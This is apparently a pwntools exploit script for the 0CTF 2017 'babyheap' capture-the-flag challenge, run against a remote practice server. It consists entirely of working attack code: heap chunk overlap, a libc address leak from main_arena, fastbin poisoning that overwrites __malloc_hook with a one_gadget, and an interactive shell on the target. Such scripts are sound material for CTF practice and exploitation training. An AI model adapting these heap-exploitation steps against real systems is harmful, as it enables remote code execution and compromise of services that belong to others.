from pwn import *

context.log_level = "debug"

exe = ELF("./babyheap_0ctf_2017")
libc = ELF("./libc.so")
# r = process(
#     ["./ld-2.23.so", "./babyheap_0ctf_2017"], env={"LD_PRELOAD": "./libc-2.23.so"}
# )
r = remote("node4.buuoj.cn", 26579)


def recv_menu():
    r.recvuntil(b"Command: ")


def allocate(size: int):
    recv_menu()
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(str(size).encode())


def fill(index: int, content: bytes):
    recv_menu()
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(str(index).encode())
    r.recvuntil(b"Size: ")
    r.sendline(str(len(content)).encode())
    r.recvuntil(b"Content: ")
    r.send(content)


def free(index: int):
    recv_menu()
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(str(index).encode())


def dump(index: int) -> bytes:
    recv_menu()
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(str(index).encode())


allocate(0x10)  # index = 0
allocate(0x10)  # index = 1
allocate(0x10)  # index = 2
allocate(0x60)  # index = 3
allocate(0x60)  # index = 4
fill(0, p64(0) * 3 + p64(0x41))
fill(2, p64(0) * 3 + p64(0x91))
free(1)
allocate(0x30)
fill(1, p64(0) * 3 + p64(0x91))
free(2)
dump(1)
r.recv(0x32)
main_arena = u64(r.recv(8)) - 88
success("main_arena: " + hex(main_arena))
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.sym["__malloc_hook"]
oneshell = libc_base + 0x4526a
free(4)
fill(3, p64(0) * 13 + p64(0x71) + p64(malloc_hook - 0x23))
allocate(0x60)
allocate(0x60)
fill(4, cyclic(0x13) + p64(oneshell))
allocate(1)
r.interactive()
# gdb.attach(r)
# pause()
